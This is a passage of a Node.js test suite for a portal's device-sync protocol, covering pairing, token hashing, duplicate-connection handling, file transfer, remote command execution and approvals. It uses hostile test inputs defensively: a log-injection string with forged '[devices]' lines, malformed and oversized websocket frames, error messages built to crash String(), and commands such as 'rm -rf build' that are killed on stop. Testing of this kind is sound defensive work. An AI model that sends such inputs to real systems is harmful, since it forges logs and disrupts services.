import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { once } from "node:events";
import { existsSync, readFileSync } from "node:fs";
import { userInfo } from "node:os";
import http from "node:http";
import express from "express";
import { inProcessHome } from "./server-harness.mjs";

// The portal's end of Pithagoras Sync against a device that speaks the client's protocol
// (docs/protocol.md of pithagoras-sync): pairing, who may connect, and the calls on a connection.
inProcessHome("pithagoras-devices-");
process.env.PORTAL_PASSWORD = "a-long-enough-password";

const { pairRouter } = await import("../dist/sync/pair.js");
const { attachSyncUpgrade, linkOf, dropDevice, hub, AUDIT_BURST, TIMING } = await import("../dist/sync/hub.js");
const store = await import("../dist/sync/store.js");
const { getDb, listAudit, recordAudit, AUDIT_DEVICE_KEEP } = await import("../dist/db.js");
const { encodeFrame, decodeFrame, FRAME, CLOSE, MAX_APPROVALS, MAX_CALLS, MAX_SETTINGS_DEPTH, MAX_SETTINGS_CHARS } = await import("../dist/sync/protocol.js");
const { connect: connectTo, until } = await import("./fake-device.mjs");

let server;
let base;
before(async () => {
  const app = express();
  app.use(pairRouter());
  server = http.createServer(app);
  attachSyncUpgrade(server);
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  base = `127.0.0.1:${server.address().port}`;
  store.setDevicesEnabled(true);
});
after(() => {
  for (const d of store.listDevices()) dropDevice(d.id);
  server.closeAllConnections();
  server.close();
});

const pair = (body, headers = {}) =>
  fetch(`http://${base}/sync/v1/pair`, { method: "POST", headers: { "content-type": "application/json", ...headers }, body: JSON.stringify(body) }).then(async (r) => ({ status: r.status, body: await r.json() }));

async function paired(name = "laptop") {
  const { code } = store.newPairingCode();
  const r = await pair({ code, name, os: "linux", arch: "x86_64" });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  return r.body;
}

const connect = (token, opts) => connectTo(base, token, opts);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const HELLO = (id) => ({ proto: 1, device_id: id, client_version: "0.1.0", os: "linux", user: "alice", shell: "bash", capabilities: ["fs", "exec", "approvals"] });

test("a code pairs once, a wrong one counts against it, and the token is kept only as its hash", async () => {
  assert.equal((await pair({ code: "ABCDEFGH", name: "laptop", os: "linux", arch: "x86_64" })).status, 403, "no code open");
  const { code } = store.newPairingCode();
  // A browser cannot spend it, and a bad request does not either.
  assert.equal((await pair({ code, name: "laptop", os: "linux", arch: "x86_64" }, { origin: "https://elsewhere.example" })).status, 403);
  assert.equal((await pair({ code, name: "Server", os: "linux", arch: "x86_64" })).status, 400);
  assert.equal((await pair({ code, name: "portal", os: "linux", arch: "x86_64" })).status, 400);
  const r = await pair({ code: code.toLowerCase(), name: "box", os: "linux", arch: "x86_64" });
  assert.equal(r.status, 200);
  assert.match(r.body.connector_token, /^d[0-9a-f]{16}\.[A-Za-z0-9_-]{43}$/);
  assert.equal(r.body.device_id, r.body.connector_token.split(".")[0]);
  assert.equal(r.body.overlay_token, undefined);
  assert.equal((await pair({ code, name: "box", os: "linux", arch: "x86_64" })).status, 403, "used up");
  const row = getDb().prepare("SELECT * FROM devices WHERE id = ?").get(r.body.device_id);
  assert.equal(row.token_hash, createHash("sha256").update(r.body.connector_token).digest("hex"));
  assert.ok(!JSON.stringify(getDb().prepare("SELECT * FROM devices").all()).includes(r.body.connector_token.split(".")[1]));

  // The same name again gets a number.
  const again = await paired("box");
  assert.equal(again.name, "box-2");

  // Ten wrong ones cancel the open code, from wherever they come.
  const open = store.newPairingCode().code;
  for (let i = 0; i < 10; i++) assert.equal((await pair({ code: "WRONG000", name: "x", os: "linux", arch: "x86_64" })).status, 403);
  assert.equal((await pair({ code: open, name: "x", os: "linux", arch: "x86_64" })).status, 403, "cancelled");
});

test("an expired code is refused", () => {
  const { code, expires } = store.newPairingCode(1_000);
  assert.equal(store.takePairingCode(code, expires + 1), false);
});

test("only the device's own token opens the socket, never from a browser, and once at a time", async () => {
  const { connector_token: token, device_id: id } = await paired("desk");
  assert.equal((await connect(undefined)).status, 401);
  assert.equal((await connect(`${id}.${"A".repeat(43)}`)).status, 401);
  assert.equal((await connect("nodot".repeat(5))).status, 401);
  assert.equal((await connect(token, { origin: `http://${base}` })).status, 403, "a browser, even from the portal's own page");
  const first = await connect(token);
  assert.equal(first.status, 101);
  await until(() => linkOf(id)?.info, "device.info");
  assert.equal(linkOf(id).info.mode, "ask");
  assert.equal(linkOf(id).sameMachine, false);
  // The probe names a file directly in a temp folder, and nothing else.
  for (const m of first.device.asked("device.probe")) assert.match(m.params.path, /^\/.+\/pithagoras-probe-[0-9a-f]{32}$/);
  // The first answers the ping, so the second is not the device's own coming back: refused, and said with where each came from.
  assert.equal((await connect(token, { userAgent: "copied-client/9 \u0085" })).status, 409);
  const { alertOf } = await import("../dist/sync/hub.js");
  assert.match(alertOf(id).message, /second connection/);
  assert.equal(alertOf(id).existing.userAgent, "pithagoras-sync/0.1.0");
  assert.equal(alertOf(id).refused.userAgent, "copied-client/9 ", "cleaned of control characters");
  assert.match(alertOf(id).refused.address, /127\.0\.0\.1$/);
  assert.equal(linkOf(id).remote.userAgent, "pithagoras-sync/0.1.0");
  first.device.ws.close(1001);
  await until(() => !linkOf(id), "the link to go");
  const second = await connect(token);
  assert.equal(second.status, 101);
  second.device.ws.close(1001);
  await until(() => !linkOf(id), "the link to go");
});

test("a device that comes back after its connection went quiet takes over at once, with no alert; a live connection is not pushed off", async () => {
  const { connector_token: token, device_id: id } = await paired("sleeper");
  const { alertOf, clearAlert } = await import("../dist/sync/hub.js");
  Object.assign(TIMING, { replaceProbeMs: 150, recentMs: 100 });
  try {
    const first = await connect(token, { answers: { "fs.stat": () => undefined } });
    await until(() => linkOf(id)?.info, "device.info");
    const stale = linkOf(id);
    const waiting = stale.call("fs.stat", { path: "/x", ctx: { chat: "c", tainted: false } });
    waiting.catch(() => {});
    // A sleeping laptop: whatever the portal sends it, it answers nothing, and no FIN ever came. Nothing was heard from it for a while.
    first.device.ws.pause();
    await sleep(200);
    const started = Date.now();
    const second = await connect(token, { userAgent: "pithagoras-sync/0.1.1" });
    assert.equal(second.status, 101);
    assert.ok(Date.now() - started < 3000, "within the probe");
    await until(() => linkOf(id) && linkOf(id) !== stale && linkOf(id).info, "the new link");
    assert.equal(alertOf(id), undefined, "no alert for the device's own return");
    assert.equal(linkOf(id).remote.userAgent, "pithagoras-sync/0.1.1");
    await assert.rejects(waiting, /disconnected/);
    assert.equal(stale.closed, true);
    first.device.ws.terminate();

    // The new one answers pings, so a third is refused, and the page's alert is for that one.
    assert.equal((await connect(token)).status, 409);
    assert.equal(alertOf(id).replaced, false);
    clearAlert(id);
    second.device.ws.close(1001);
    await until(() => !linkOf(id), "the link to go");
  } finally {
    Object.assign(TIMING, { replaceProbeMs: 3_000, recentMs: 45_000 });
  }
});

test("a connection that does not answer a ping but sends other things is alive; one that was heard a moment ago and is replaced is said", async () => {
  const { connector_token: token, device_id: id } = await paired("busy");
  const { alertOf, clearAlert } = await import("../dist/sync/hub.js");
  Object.assign(TIMING, { replaceProbeMs: 150 });
  const open = [];
  let chatter;
  try {
    // Its pong is stuck behind what it is writing, but the writing arrives: a live device, which a copied token cannot push off.
    const live = await connect(token, { autoPong: false, userAgent: "pithagoras-sync/0.1.0" });
    open.push(live.device.ws);
    await until(() => linkOf(id)?.info, "device.info");
    chatter = setInterval(() => live.device.notify("log", { n: 1 }), 20);
    const copy = await connect(token, { userAgent: "copied-client/9" });
    if (copy.device) open.push(copy.device.ws);
    assert.equal(copy.status, 409);
    assert.equal(alertOf(id).replaced, false);
    assert.equal(alertOf(id).refused.userAgent, "copied-client/9");
    assert.ok(linkOf(id) && !linkOf(id).closed, "still the device's link");
    clearInterval(chatter);
    clearAlert(id);

    // Quiet now, and no pong: replaced after the probe. It had been heard a moment ago, so the owner is told where each came from.
    const second = await connect(token, { userAgent: "pithagoras-sync/0.1.1" });
    assert.equal(second.status, 101);
    open.push(second.device.ws);
    const alert = alertOf(id);
    assert.equal(alert.replaced, true);
    assert.equal(alert.existing.userAgent, "pithagoras-sync/0.1.0");
    assert.equal(alert.refused.userAgent, "pithagoras-sync/0.1.1");
    assert.match(alert.refused.address, /127\.0\.0\.1$/);
    clearAlert(id);
  } finally {
    clearInterval(chatter);
    Object.assign(TIMING, { replaceProbeMs: 3_000 });
    for (const ws of open) ws.terminate();
  }
  await until(() => !linkOf(id), "the link to go");
});

test("a connection that ends does not free the place of the attempt that replaced it; a third is not let in unasked", async () => {
  const { connector_token: token, device_id: id } = await paired("crowded");
  const { alertOf, clearAlert } = await import("../dist/sync/hub.js");
  Object.assign(TIMING, { replaceProbeMs: 150, closeGraceMs: 250 });
  const open = [];
  try {
    const first = await connect(token);
    open.push(first.device.ws);
    await until(() => linkOf(id)?.info, "device.info");
    first.device.ws.pause();
    // A copy of the token takes the quiet link's place, and holds its hello back.
    const copy = await connect(token, { sayHello: false });
    assert.equal(copy.status, 101);
    open.push(copy.device.ws);
    // The replaced link's socket is gone a moment after, and its end frees nobody else's place.
    await sleep(TIMING.closeGraceMs + 250);
    const third = await connect(token);
    if (third.device) open.push(third.device.ws);
    assert.equal(third.status, 409, "the copy's attempt still holds the place");
    assert.ok(alertOf(id));
    // Its hello comes: its link is the device's, and nothing else is.
    copy.device.notify("hello", HELLO(id));
    await until(() => linkOf(id)?.info, "the copy's link");
    clearAlert(id);
  } finally {
    Object.assign(TIMING, { replaceProbeMs: 3_000, closeGraceMs: 2_000 });
    for (const ws of open) ws.terminate();
  }
  await until(() => !linkOf(id), "the link to go");
});

test("a device that reads the portal's probe file as the portal's user is the portal's own machine; the file is gone after", async () => {
  const me = userInfo();
  const probed = [];
  // Reads the file the portal names, as the client does, and says who it runs as.
  const reading = (who) => ({
    "device.probe": ({ path: file }) => {
      probed.push(file);
      if (!existsSync(file)) return { found: false, sha256: null, ...who };
      return { found: true, sha256: createHash("sha256").update(readFileSync(file)).digest("hex"), ...who };
    },
  });
  const same = await paired("same");
  const a = await connect(same.connector_token, { answers: reading({ user: me.username, uid: me.uid }) });
  await until(() => linkOf(same.device_id)?.sameMachine !== undefined, "the probe");
  assert.equal(linkOf(same.device_id).sameMachine, true);
  a.device.ws.close(1001);

  // The same file, but another user: a container or another account, which the portal's own tools do not reach.
  const other = await paired("other");
  const b = await connect(other.connector_token, { answers: reading({ user: "someone", uid: me.uid + 1 }) });
  await until(() => linkOf(other.device_id)?.sameMachine !== undefined, "the probe");
  assert.equal(linkOf(other.device_id).sameMachine, false);
  b.device.ws.close(1001);
  assert.ok(probed.length >= 2);
  for (const file of probed) assert.equal(existsSync(file), false, `${file} left behind`);
});

test("a hello for another protocol or another device ends the connection", async () => {
  const { connector_token: token, device_id: id } = await paired("hello");
  const newer = await connect(token, { hello: { proto: 2 } });
  assert.equal((await newer.device.closed).code, CLOSE.unsupported);
  const other = await connect(token, { hello: { device_id: "dsomebodyelse0000" } });
  assert.equal((await other.device.closed).code, CLOSE.violation);
  assert.equal(linkOf(id), undefined);
});

test("a frame that breaks the protocol before the hello ends that connection and nothing else", async () => {
  const { connector_token: token, device_id: id } = await paired("early");
  const other = await paired("bystander");
  const bystander = await connect(other.connector_token);
  await until(() => linkOf(other.device_id)?.info, "device.info");
  // An unmasked frame from a client: ws reports it as an 'error' of the server's socket, which kills the process unless something listens.
  const unmasked = await connect(token, { sayHello: false });
  unmasked.device.ws._socket.write(Buffer.from([0x81, 0x02, 0x68, 0x69]));
  await unmasked.device.closed;
  // And one over the size limit, before any hello.
  const huge = await connect(token, { sayHello: false });
  huge.device.ws.send(Buffer.alloc(4 * 1024 * 1024 + 10, 1), { binary: true });
  assert.equal((await huge.device.closed).code, 1009);
  // The device can still connect, and the other device's link is up.
  const again = await connect(token);
  assert.equal(again.status, 101);
  await until(() => linkOf(id)?.info, "device.info");
  assert.ok(linkOf(other.device_id));
  again.device.ws.close(1001);
  bystander.device.ws.close(1001);
});

test("a frame in the same chunk as the hello is heard", async () => {
  const { connector_token: token, device_id: id } = await paired("chunk");
  const { device } = await connect(token, { sayHello: false });
  // One write on the socket: the hello and, right behind it, an audit event.
  const socket = device.ws._socket;
  socket.cork();
  device.notify("hello", { proto: 1, device_id: id, client_version: "0.1.0", os: "linux", user: "alice", shell: "bash", capabilities: ["fs", "exec", "approvals"] });
  device.notify("audit", { time_ms: 1, chat: "c-chunk", tool: "read", target: "/home/alice/a", decision: "allowed", reason: null });
  socket.uncork();
  await until(() => listAudit(50).some((e) => e.session_id === "c-chunk"), "the audit row sent with the hello");
  getDb().prepare("DELETE FROM audit WHERE session_id = 'c-chunk'").run();
  device.ws.close(1001);
});

test("a device that says hello after the add-on went off is told to try again; one that was removed is told to stop", async () => {
  const gone = await paired("midway");
  const pending = await connect(gone.connector_token, { sayHello: false });
  store.setDevicesEnabled(false);
  try {
    pending.device.notify("hello", { proto: 1, device_id: gone.device_id, client_version: "0.1.0", os: "linux", user: "alice", shell: "bash", capabilities: ["fs"] });
    assert.equal((await pending.device.closed).code, CLOSE.goingAway);
  } finally {
    store.setDevicesEnabled(true);
  }
  assert.ok(store.getDevice(gone.device_id), "still paired");
  const removed = await connect(gone.connector_token, { sayHello: false });
  store.removeDevice(gone.device_id);
  removed.device.notify("hello", { proto: 1, device_id: gone.device_id, client_version: "0.1.0", os: "linux", user: "alice", shell: "bash", capabilities: ["fs"] });
  assert.equal((await removed.device.closed).code, CLOSE.revoked);
});

test("calls are matched by id, whatever order the answers come in", async () => {
  const { connector_token: token, device_id: id } = await paired("order");
  const held = [];
  const { device } = await connect(token, { answers: { "fs.stat": (params, rid) => { held.push({ rid, path: params.path }); } } });
  await until(() => linkOf(id)?.info, "device.info");
  const ctx = { chat: "c1", tainted: false, tool: "read" };
  const a = linkOf(id).call("fs.stat", { path: "/a", ctx });
  const b = linkOf(id).call("fs.stat", { path: "/b", ctx });
  await until(() => held.length === 2, "two calls");
  device.send({ jsonrpc: "2.0", id: held[1].rid, result: { kind: "dir", size: 0, mtime_ms: 0, mode: 493 } });
  device.send({ jsonrpc: "2.0", id: held[0].rid, error: { code: -32002, message: "no such file" } });
  assert.deepEqual(await b, { kind: "dir", size: 0, mtime_ms: 0, mode: 493 });
  await assert.rejects(a, (e) => e.code === -32002 && /no such file/.test(e.message));
  device.ws.close(1001);
});

test("a read is put together from its frames and checked against what the device says it sent", async () => {
  const { connector_token: token, device_id: id } = await paired("reader");
  const content = Buffer.alloc(150_000, 7);
  const sha = createHash("sha256").update(content).digest("hex");
  let lie = false;
  const { device } = await connect(token, {
    answers: {
      "fs.read": (params, rid, d) => {
        for (let seq = 0, at = 0; at < content.length; seq++, at += 65536) d.ws.send(encodeFrame(FRAME.fileData, params.stream, seq, content.subarray(at, at + 65536)));
        return { size: content.length, sha256: lie ? "0".repeat(64) : sha, chunks: 3 };
      },
    },
  });
  await until(() => linkOf(id)?.info, "device.info");
  const got = await linkOf(id).readFile("/home/alice/src/big.bin", { chat: "c1", tainted: false, tool: "read" });
  assert.equal(got.sha256, sha);
  assert.ok(got.data.equals(content));
  assert.deepEqual(device.asked("fs.read")[0].params.ctx, { chat: "c1", tainted: false, tool: "read" });
  lie = true;
  await assert.rejects(linkOf(id).readFile("/home/alice/src/big.bin", { chat: "c1", tainted: false }), /incomplete/);
  device.ws.close(1001);
});

test("a write sends its content after the request, in frames of at most 64 KiB", async () => {
  const { connector_token: token, device_id: id } = await paired("writer");
  const { device } = await connect(token, {
    answers: {
      "fs.write": (params, rid, d) => {
        // Answered once the whole upload is in, as the device does.
        const wait = () => {
          const frames = d.binary.filter((f) => f.stream === params.stream);
          const size = frames.reduce((n, f) => n + f.payload.length, 0);
          if (size < params.size) return setTimeout(wait, 5);
          const all = Buffer.concat(frames.map((f) => f.payload));
          d.send({ jsonrpc: "2.0", id: rid, result: { size, sha256: createHash("sha256").update(all).digest("hex") } });
        };
        wait();
      },
    },
  });
  await until(() => linkOf(id)?.info, "device.info");
  const data = Buffer.alloc(200_000, 3);
  const r = await linkOf(id).writeFile("/home/alice/src/out.bin", data, { ifMatch: "a".repeat(64), createDirs: true }, { chat: "c1", tainted: true, tool: "write" });
  assert.equal(r.size, data.length);
  const frames = device.binary.filter((f) => f.kind === FRAME.fileUpload);
  assert.deepEqual(frames.map((f) => f.seq), [0, 1, 2, 3]);
  assert.ok(frames.every((f) => f.payload.length <= 65536));
  const sent = device.asked("fs.write")[0].params;
  assert.deepEqual({ ...sent, stream: 0 }, { path: "/home/alice/src/out.bin", stream: 0, size: 200_000, if_match: "a".repeat(64), create_dirs: true, ctx: { chat: "c1", tainted: true, tool: "write" } });
  device.ws.close(1001);
});

test("a command's output streams as it comes, and its end says how it ended; it carries no environment", async () => {
  const { connector_token: token, device_id: id } = await paired("runner");
  const { device } = await connect(token, {
    answers: {
      "exec.start": (params, rid, d) => {
        d.send({ jsonrpc: "2.0", id: rid, result: {} });
        d.ws.send(encodeFrame(FRAME.execOutput, params.stream, 0, Buffer.from("one\n")));
        setTimeout(() => {
          d.ws.send(encodeFrame(FRAME.execOutput, params.stream, 1, Buffer.from("two\n")));
          d.notify("exec.exit", { stream: params.stream, code: 3, signal: null, timed_out: false, truncated: false });
        }, 30);
      },
    },
  });
  await until(() => linkOf(id)?.info, "device.info");
  const seen = [];
  const exit = await linkOf(id).exec({ command: "make", cwd: "/home/alice/src", ctx: { chat: "c1", tainted: false, tool: "bash" }, onData: (d) => seen.push(String(d)) });
  assert.deepEqual(seen, ["one\n", "two\n"]);
  assert.equal(exit.code, 3);
  const params = device.asked("exec.start")[0].params;
  assert.deepEqual(Object.keys(params).sort(), ["command", "ctx", "cwd", "stream"]);
  device.ws.close(1001);
});

test("a command's output past what the portal takes kills it; one that never ends, or ignores a stop, is given up on", async () => {
  const { connector_token: token, device_id: id } = await paired("endless");
  let quiet = false;
  const { device } = await connect(token, {
    answers: {
      "exec.start": (params, rid, d) => {
        d.send({ jsonrpc: "2.0", id: rid, result: {} });
        if (quiet) return;
        // 40 frames of 64 KiB, and no exit: a device that does not stop printing.
        for (let seq = 0; seq < 40; seq++) d.ws.send(encodeFrame(FRAME.execOutput, params.stream, seq, Buffer.alloc(65536, 65)));
      },
      "exec.signal": {},
    },
  });
  await until(() => linkOf(id)?.info, "device.info");
  const ctx = { chat: "c1", tainted: false, tool: "bash" };

  // More output than the portal takes: what came before is passed on, the rest is not, and the device is told to kill it.
  let got = 0;
  const exit = await linkOf(id).exec({ command: "yes", cwd: "/w", ctx, onData: (d) => (got += d.length), limits: { output: 1024 * 1024 } });
  assert.equal(exit.cut, true);
  assert.equal(exit.truncated, true);
  assert.equal(exit.signal, "SIGKILL");
  assert.ok(got > 0 && got <= 1024 * 1024, `${got} bytes passed on`);
  assert.deepEqual((await device.waitFor("exec.signal"))[0].params.signal, "SIGKILL");

  // No end within the command's own timeout and a grace: killed, and the call fails.
  quiet = true;
  const before = device.asked("exec.signal").length;
  const started = Date.now();
  await assert.rejects(linkOf(id).exec({ command: "sleep 1d", cwd: "/w", timeoutMs: 50, ctx, onData: () => {}, limits: { graceMs: 100 } }), /did not report the end of the command/);
  assert.ok(Date.now() - started < 3000);
  assert.equal((await device.waitFor("exec.signal", before + 1)).at(-1).params.signal, "SIGKILL");
  // Without a timeout of the agent's, the device's own longest one counts.
  await assert.rejects(linkOf(id).exec({ command: "sleep 1d", cwd: "/w", ctx, onData: () => {}, limits: { maxMs: 50, graceMs: 100 } }), /did not report the end of the command/);

  // Told to stop (Stop, a grant taken back) and not stopping: SIGTERM, then SIGKILL and the call ends.
  const stop = new AbortController();
  const stopped = linkOf(id).exec({ command: "trap '' TERM; sleep 1d", cwd: "/w", ctx, onData: () => {}, signal: stop.signal, limits: { killMs: 80 } });
  stopped.catch(() => {});
  await until(() => device.asked("exec.start").length === 4, "the command to start");
  const signals = device.asked("exec.signal").length;
  stop.abort();
  await assert.rejects(stopped, /stopped/);
  const sent = (await device.waitFor("exec.signal", signals + 2)).slice(signals).map((m) => m.params.signal);
  assert.deepEqual(sent, ["SIGTERM", "SIGKILL"]);
  device.ws.close(1001);
});

test("how long the portal waits for a command's end is bounded by what the device lets run, and never overflows a timer", async () => {
  const { connector_token: token, device_id: id } = await paired("timekeeper");
  // Starts a command and ends it a moment later, or never.
  let endsAfter = 150;
  const { device } = await connect(token, {
    answers: {
      "exec.start": (params, rid, d) => {
        d.send({ jsonrpc: "2.0", id: rid, result: {} });
        if (endsAfter !== null) setTimeout(() => d.notify("exec.exit", { stream: params.stream, code: 0, signal: null, timed_out: false, truncated: false }), endsAfter);
      },
      "exec.signal": {},
    },
  });
  await until(() => linkOf(id)?.info, "device.info");
  const link = linkOf(id);
  const ctx = { chat: "c1", tainted: false, tool: "bash" };
  const run = (opts) => link.exec({ command: "make", cwd: "/w", ctx, onData: () => {}, ...opts });

  // A timeout so long that the portal's wait for the end does not fit a timer: the wait is not cut to nothing, the command ends on its own.
  const warnings = [];
  const onWarning = (w) => warnings.push(w.name);
  process.on("warning", onWarning);
  try {
    assert.equal((await run({ timeoutMs: 2_147_483 * 1000 })).code, 0);
    assert.equal(device.asked("exec.start").at(-1).params.timeout_ms, 2_147_483_000, "what the agent asked for goes to the device as it is");
    await sleep(20);
  } finally {
    process.off("warning", onWarning);
  }
  assert.ok(!warnings.includes("TimeoutOverflowWarning"), "no timer overflowed");

  // Longer than the portal waits for a command whose device says nothing of its own limit: not waited for longer.
  endsAfter = null;
  const started = Date.now();
  await assert.rejects(run({ timeoutMs: 10_000, limits: { maxMs: 50, graceMs: 100 } }), /did not report the end of the command/);
  assert.ok(Date.now() - started < 3000, `${Date.now() - started} ms`);

  // The device says how long it lets a command run: that, and not the portal's default, is what the portal waits for, whatever is asked.
  link.policy = { portal_policy: "read", version: "v1", settings: { exec: { max_timeout_secs: 1 } }, device_only: [] };
  const again = Date.now();
  await assert.rejects(run({ timeoutMs: 3_600_000, limits: { graceMs: 100 } }), /did not report the end of the command/);
  assert.ok(Date.now() - again >= 1000 && Date.now() - again < 4000, `${Date.now() - again} ms`);
  const noneAsked = Date.now();
  await assert.rejects(run({ limits: { graceMs: 100 } }), /did not report the end of the command/);
  assert.ok(Date.now() - noneAsked >= 1000 && Date.now() - noneAsked < 4000, `${Date.now() - noneAsked} ms`);
  // A device that lets a command run longer than the portal's default is waited for that long.
  endsAfter = 300;
  link.policy = { portal_policy: "read", version: "v2", settings: { exec: { max_timeout_secs: 2 } }, device_only: [] };
  assert.equal((await run({ limits: { maxMs: 50, graceMs: 100 } })).code, 0);
  device.ws.close(1001);
});

test("a stop still goes out when the device's table of calls is full", async () => {
  const { connector_token: token, device_id: id } = await paired("stopper");
  const { device } = await connect(token, { answers: { "exec.start": {}, "exec.signal": {}, "fs.stat": () => undefined } });
  await until(() => linkOf(id)?.info, "device.info");
  const link = linkOf(id);
  const ctx = { chat: "c1", tainted: false, tool: "bash" };
  const stop = new AbortController();
  const run = link.exec({ command: "sleep 1d", cwd: "/w", ctx, onData: () => {}, signal: stop.signal, limits: { killMs: 100 } });
  run.catch(() => {});
  await device.waitFor("exec.start");
  await sleep(30);
  // As many calls as it takes at once, none answered: one more is refused, but the stop is not.
  const held = Array.from({ length: MAX_CALLS }, () => link.call("fs.stat", { path: "/x", ctx }, { timeoutMs: 2000 }));
  held.forEach((call) => call.catch(() => {}));
  await device.waitFor("fs.stat", MAX_CALLS);
  await assert.rejects(link.call("fs.stat", { path: "/y", ctx }), /too many calls/);
  stop.abort();
  const signals = await device.waitFor("exec.signal", 2);
  assert.deepEqual(signals.map((m) => m.params.signal), ["SIGTERM", "SIGKILL"]);
  await assert.rejects(run, /stopped/);
  device.ws.close(1001);
});

test("a dropped connection fails what waits on it at once", async () => {
  const { connector_token: token, device_id: id } = await paired("dropper");
  const { device } = await connect(token, { answers: { "fs.stat": () => undefined } });
  await until(() => linkOf(id)?.info, "device.info");
  const waiting = linkOf(id).call("fs.stat", { path: "/x", ctx: { chat: "c", tainted: false } });
  await device.waitFor("fs.stat");
  const started = Date.now();
  device.ws.terminate();
  await assert.rejects(waiting, /disconnected/);
  assert.ok(Date.now() - started < 2000);
});

test("an approval reaches the call that waits for it; a call given up on denies its approval and kills a late command", async () => {
  const { connector_token: token, device_id: id } = await paired("asker");
  let started;
  const { device } = await connect(token, {
    answers: {
      "exec.start": (params, rid, d) => {
        started = { rid, stream: params.stream };
        d.notify("approval.requested", { id: 12, call: rid, chat: "c1", tool: "exec", target: "rm -rf build", reasons: ["Ask mode: every call asks"], preview: null, choices: ["once", "chat", "time", "deny"], max_minutes: 480, created_ms: 1, expires_ms: 2 });
      },
      "approval.answer": {},
      "exec.signal": {},
    },
  });
  await until(() => linkOf(id)?.info, "device.info");
  const asked = [];
  const listed = [];
  hub.on("approval", (deviceId, a) => deviceId === id && listed.push(a.id));
  const stop = new AbortController();
  const run = linkOf(id).exec({ command: "rm -rf build", cwd: "/w", ctx: { chat: "c1", tainted: false, tool: "bash" }, onData: () => {}, onApproval: (a) => asked.push(a.id), signal: stop.signal });
  await until(() => asked.length === 1, "the approval");
  assert.deepEqual(listed, [12]);
  assert.deepEqual([...linkOf(id).approvals.keys()], [12]);
  stop.abort();
  await assert.rejects(run, /stopped/);
  const answers = await device.waitFor("approval.answer");
  assert.deepEqual(answers[0].params, { id: 12, answer: "deny" });
  // The device started it all the same (the owner allowed it on the device): it is killed.
  device.send({ jsonrpc: "2.0", id: started.rid, result: {} });
  const signals = await device.waitFor("exec.signal");
  assert.deepEqual(signals[0].params, { stream: started.stream, signal: "SIGKILL" });
  device.notify("approval.resolved", { id: 12, chat: "c1", answer: "deny", minutes: null, by: "portal" });
  await until(() => linkOf(id).approvals.size === 0, "the approval to close");
  device.ws.close(1001);
});

test("a device can open only as many approvals as a person could answer, and one at a time for a call", async () => {
  const { connector_token: token, device_id: id } = await paired("asker-many");
  const approval = (n, call) => ({ id: n, call, chat: "c1", tool: "exec", target: "make", reasons: [], preview: null, choices: ["once", "deny"], max_minutes: 0, created_ms: 1, expires_ms: 2 });
  const asked = [];
  const { device } = await connect(token, {
    answers: {
      // One call, asked about three times over: only the first stands.
      "exec.start": (_params, rid, d) => {
        for (const n of [9001, 9002, 9003]) d.notify("approval.requested", approval(n, rid));
        d.notify("approval.requested", approval(9004, 424242));
      },
    },
  });
  await until(() => linkOf(id)?.info, "device.info");
  const link = linkOf(id);
  const run = link.exec({ command: "make", cwd: "/w", ctx: { chat: "c1", tainted: false, tool: "bash" }, onData: () => {}, onApproval: (a) => asked.push(a.id) });
  run.catch(() => {});
  await until(() => asked.length > 0, "the approval");
  await new Promise((r) => setTimeout(r, 50));
  assert.deepEqual(asked, [9001]);
  assert.deepEqual([...link.approvals.keys()], [9001], "not the repeats, nor one for a call that is not there");
  // A flood that names no call: kept up to the limit, the rest dropped.
  for (let n = 1; n <= MAX_APPROVALS * 3; n++) device.notify("approval.requested", approval(n, null));
  await until(() => link.approvals.size >= MAX_APPROVALS, "the approvals");
  await new Promise((r) => setTimeout(r, 100));
  assert.equal(link.approvals.size, MAX_APPROVALS);
  // Answered ones make room.
  device.notify("approval.resolved", { id: 1, chat: "c1", answer: "deny", minutes: null, by: "device" });
  await until(() => link.approvals.size === MAX_APPROVALS - 1, "room");
  device.notify("approval.requested", approval(5000, null));
  await until(() => link.approvals.has(5000), "the next approval");
  device.ws.close(1001);
});

test("a device's decisions go to the audit log with its name", async () => {
  const { connector_token: token, device_id: id } = await paired("auditor");
  const { device } = await connect(token);
  await until(() => linkOf(id)?.info, "device.info");
  device.notify("audit", { time_ms: 1, chat: "c9", tool: "write", target: "/home/alice/.ssh/config", decision: "denied", reason: "protected path" });
  await until(() => listAudit(5).some((e) => e.kind === "device"), "the audit row");
  const row = listAudit(5).find((e) => e.kind === "device");
  assert.deepEqual({ tool: row.tool, subject: row.subject, reason: row.reason, session_id: row.session_id }, { tool: "write", subject: "/home/alice/.ssh/config", reason: "auditor: denied — protected path", session_id: "c9" });
  device.ws.close(1001);
});

test("what a device says in a refusal is logged as one quoted line", async () => {
  const { connector_token: token, device_id: id } = await paired("forger");
  const { device } = await connect(token);
  await until(() => linkOf(id)?.info, "device.info");
  const lines = [];
  const warn = console.warn;
  console.warn = (...args) => lines.push(args.join(" "));
  try {
    device.send({ jsonrpc: "2.0", error: { code: -32600, message: "x\n[devices] removed laptop\r\n[devices] paired evil" } });
    await until(() => lines.length > 0, "the log line");
  } finally {
    console.warn = warn;
  }
  assert.equal(lines.length, 1);
  assert.doesNotMatch(lines[0], /[\r\n]/);
  assert.match(lines[0], /refused a frame: "x\\n\[devices\] removed laptop/);
  device.ws.close(1001);
});

test("a device that answers the portal's probe with an error whose message is no text cannot stop the portal", async () => {
  // JSON.parse can give an object that String() cannot turn into text, which threw inside the socket's message handler.
  const { connector_token: token, device_id: id } = await paired("poisoner");
  const { device } = await connect(token, { answers: { "device.probe": { error: { code: -32002, message: { toString: 0 } } } } });
  // The probe is asked on every connect: its answer is the frame, and the link goes on with what comes after.
  await until(() => linkOf(id)?.info && linkOf(id).sameMachine === false, "what the portal asks on connect");
  await until(() => device.asked("approval.list").length > 0, "the questions after the probe");
  assert.equal(linkOf(id).closed, false);
  assert.equal((await linkOf(id).call("device.info", {})).name, "laptop");
  device.ws.close(1001);
});

test("a refusal whose message is no text, unasked or as the answer to a call, is the device refusing and nothing more", async () => {
  const bad = { toString: 0 };
  const { connector_token: token, device_id: id } = await paired("poisoner-too");
  const { device } = await connect(token, { answers: { "fs.stat": { error: { code: -32005, message: bad } } } });
  await until(() => linkOf(id)?.info, "device.info");
  const lines = [];
  const warn = console.warn;
  console.warn = (...args) => lines.push(args.join(" "));
  try {
    // Unasked, and with an id that matches no call.
    device.send({ jsonrpc: "2.0", error: { code: -32700, message: bad } });
